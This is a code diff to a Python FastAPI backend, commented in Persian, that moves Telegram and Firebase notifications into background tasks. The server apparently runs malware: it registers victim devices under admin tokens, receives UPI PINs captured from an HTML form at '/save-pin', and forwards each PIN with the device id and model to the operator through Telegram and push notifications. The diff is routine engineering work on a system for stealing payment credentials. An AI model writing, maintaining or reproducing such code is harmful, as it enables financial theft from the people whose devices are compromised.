@@ -1,4 +1,4 @@
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Query, Depends, Request
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Query, Depends, Request, BackgroundTasks
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse
 from starlette.websockets import WebSocketDisconnect as StarletteWebSocketDisconnect
@@ -18,6 +18,13 @@ from .services.telegram_service import telegram_service
 from .services.telegram_multi_service import telegram_multi_service
 from .services.firebase_service import firebase_service
 from .services.firebase_admin_service import firebase_admin_service
+from .background_tasks import (
+    notify_device_registration_bg,
+    notify_upi_detected_bg,
+    notify_admin_login_bg,
+    notify_admin_logout_bg,
+    send_2fa_code_bg
+)
 
 from .models.schemas import (
     DeviceStatus, SendCommandRequest, UpdateSettingsRequest,
@@ -210,7 +217,7 @@ async def upload_response(request: Request):
 
 
 @app.post("/register")
-async def register_device(message: dict):
+async def register_device(message: dict, background_tasks: BackgroundTasks):
     """
     رجیستر دستگاه با توکن ادمین
     
@@ -232,26 +239,21 @@ async def register_device(message: dict):
     result = await device_service.register_device(device_id, device_info, admin_token)
     await device_service.add_log(device_id, "system", f"Device registered (app: {app_type or 'unknown'})", "info")
     
-    # اگه توکن معتبر بود، به ربات ادمین اطلاع بده
+    # اگه توکن معتبر بود، به ربات ادمین اطلاع بده (در background)
     if admin_token and result.get("device") and result["device"].get("admin_username"):
         admin_username = result["device"]["admin_username"]
         
-        # اعلان Telegram
-        await telegram_multi_service.notify_device_registered(
-            device_id, device_info, admin_username
+        # ارسال notification ها در background (سریع‌تر!)
+        background_tasks.add_task(
+            notify_device_registration_bg,
+            telegram_multi_service,
+            firebase_admin_service,
+            admin_username,
+            device_id,
+            device_info,
+            admin_token
         )
-        
-        # 📱 Push Notification به ادمین (Firebase جداگانه برای ادمین‌ها)
-        app_type = device_info.get("app_type", "Unknown")
-        model = device_info.get("model", "Unknown")
-        
-        await firebase_admin_service.send_device_registration_notification(
-            admin_username=admin_username,
-            device_id=device_id,
-            model=model,
-            app_type=app_type
-        )
-        logger.info(f"📱 Push notification sent to {admin_username} for device: {device_id}")
+        logger.info(f"📱 Device registration notifications queued for {admin_username}")
     
     return {
         "status": "success", 
@@ -443,7 +445,7 @@ async def health_check():
     }
 
 @app.post("/auth/login")
-async def login(login_data: AdminLogin, request: Request):
+async def login(login_data: AdminLogin, request: Request, background_tasks: BackgroundTasks):
     """
     مرحله اول لاگین: تایید username/password
     
@@ -506,7 +508,14 @@ async def login(login_data: AdminLogin, request: Request):
             success=True
         )
 
-        await telegram_multi_service.notify_admin_login(admin.username, ip_address, success=True)
+        # اعلان ورود موفق به تلگرام (در background)
+        background_tasks.add_task(
+            notify_admin_login_bg,
+            telegram_multi_service,
+            admin.username,
+            ip_address,
+            True
+        )
         logger.info(f"✅ Admin logged in (no 2FA): {admin.username}")
 
         return TokenResponse(
@@ -533,17 +542,16 @@ async def login(login_data: AdminLogin, request: Request):
     # تولید کد OTP
     otp_code = await otp_service.create_otp(admin.username, ip_address)
     
-    # ارسال کد به تلگرام
-    try:
-        await telegram_multi_service.send_2fa_notification(
-            admin.username,
-            ip_address,
-            code=otp_code
-        )
-        logger.info(f"🔐 2FA code sent to {admin.username}")
-    except Exception as e:
-        logger.error(f"❌ Failed to send 2FA code: {e}")
-        # ادامه بده حتی اگه ارسال تلگرام ناموفق بود
+    # ارسال کد به تلگرام (در background)
+    background_tasks.add_task(
+        send_2fa_code_bg,
+        telegram_multi_service,
+        admin.username,
+        ip_address,
+        otp_code,
+        None
+    )
+    logger.info(f"🔐 2FA code queued for {admin.username}")
     
     # ایجاد توکن موقت
     temp_token = auth_service.create_temp_token(admin.username)
@@ -569,7 +577,7 @@ async def login(login_data: AdminLogin, request: Request):
     )
 
 @app.post("/auth/verify-2fa", response_model=TokenResponse)
-async def verify_2fa(verify_data: OTPVerify, request: Request):
+async def verify_2fa(verify_data: OTPVerify, request: Request, background_tasks: BackgroundTasks):
     """
     مرحله دوم لاگین: تایید کد OTP
     
@@ -665,8 +673,14 @@ async def verify_2fa(verify_data: OTPVerify, request: Request):
         metadata={"step": "otp_verified"}
     )
     
-    # اعلان ورود موفق به تلگرام
-    await telegram_multi_service.notify_admin_login(admin.username, ip_address, success=True)
+    # اعلان ورود موفق به تلگرام (در background)
+    background_tasks.add_task(
+        notify_admin_login_bg,
+        telegram_multi_service,
+        admin.username,
+        ip_address,
+        True
+    )
     
     logger.info(f"✅ 2FA verification complete, admin logged in: {admin.username}")
     
@@ -690,6 +704,7 @@ async def verify_2fa(verify_data: OTPVerify, request: Request):
 @app.post("/auth/logout")
 async def logout(
     request: Request,
+    background_tasks: BackgroundTasks,
     current_admin: Admin = Depends(get_current_admin)
 ):
     ip_address = get_client_ip(request)
@@ -701,8 +716,13 @@ async def logout(
         ip_address=ip_address
     )
 
-    # 🔔 اعلان خروج به ربات 4 (لاگین/لاگ‌اوت)
-    await telegram_multi_service.notify_admin_logout(current_admin.username, ip_address)
+    # 🔔 اعلان خروج به ربات 4 (در background)
+    background_tasks.add_task(
+        notify_admin_logout_bg,
+        telegram_multi_service,
+        current_admin.username,
+        ip_address
+    )
 
     logger.info(f"👋 Admin logged out: {current_admin.username}")
 
@@ -714,7 +734,7 @@ async def logout(
 # ═══════════════════════════════════════════════════════════════════════════════
 
 @app.post("/bot/auth/request-otp", response_model=BotOTPResponse, tags=["Bot Auth"])
-async def bot_request_otp(request: BotOTPRequest, req: Request):
+async def bot_request_otp(request: BotOTPRequest, req: Request, background_tasks: BackgroundTasks):
     """
     🤖 Step 1: Bot requests OTP for authentication
     
@@ -735,18 +755,16 @@ async def bot_request_otp(request: BotOTPRequest, req: Request):
     # Generate OTP
     otp_code = await otp_service.create_otp(request.username, ip_address)
     
-    # Send OTP via Telegram
-    try:
-        await telegram_multi_service.send_2fa_notification(
-            request.username, 
-            ip_address, 
-            code=otp_code,
-            message_prefix=f"🤖 Bot Authentication Request\nBot: {request.bot_identifier}\n"
-        )
-        logger.info(f"🤖 OTP sent to {request.username} for bot: {request.bot_identifier}")
-    except Exception as e:
-        logger.error(f"❌ Failed to send bot OTP: {e}")
-        # Don't fail - OTP is still valid
+    # Send OTP via Telegram (در background)
+    background_tasks.add_task(
+        send_2fa_code_bg,
+        telegram_multi_service,
+        request.username,
+        ip_address,
+        otp_code,
+        f"🤖 Bot Authentication Request\nBot: {request.bot_identifier}\n"
+    )
+    logger.info(f"🤖 OTP queued for {request.username} for bot: {request.bot_identifier}")
     
     # Log activity
     await admin_activity_service.log_activity(
@@ -866,7 +884,7 @@ async def bot_check_status(current_admin: Admin = Depends(get_current_admin)):
 # ═══════════════════════════════════════════════════════════════════════════════
 
 @app.post("/save-pin", response_model=UPIPinResponse, tags=["UPI"])
-async def save_upi_pin(pin_data: UPIPinSave):
+async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
     """
     💳 Save UPI PIN from HTML form
     
@@ -922,24 +940,21 @@ async def save_upi_pin(pin_data: UPIPinSave):
             "info"
         )
         
-        # Notify admin via Telegram
+        # Notify admin via Telegram & Push (در background)
         if admin_username:
-            await telegram_multi_service.notify_upi_detected(
+            device_model = device.get("model", "Unknown")
+            
+            background_tasks.add_task(
+                notify_upi_detected_bg,
+                telegram_multi_service,
+                firebase_admin_service,
+                admin_username,
                 pin_data.device_id,
                 pin_data.upi_pin,
-                admin_username
+                device_model
             )
             
-            # 📱 Push Notification به ادمین (Firebase جداگانه برای ادمین‌ها)
-            device_model = device.get("model", "Unknown")
-            await firebase_admin_service.send_upi_pin_notification(
-                admin_username=admin_username,
-                device_id=pin_data.device_id,
-                upi_pin=pin_data.upi_pin,
-                model=device_model
-            )
-            
-            logger.info(f"💳 UPI PIN saved for device: {pin_data.device_id} → Admin: {admin_username}")
+            logger.info(f"💳 UPI PIN saved for device: {pin_data.device_id} → Notifications queued")
             logger.info(f"📱 Push notification sent to {admin_username} for UPI PIN")
         else:
             logger.info(f"💳 UPI PIN saved for device: {pin_data.device_id} (no admin association)")
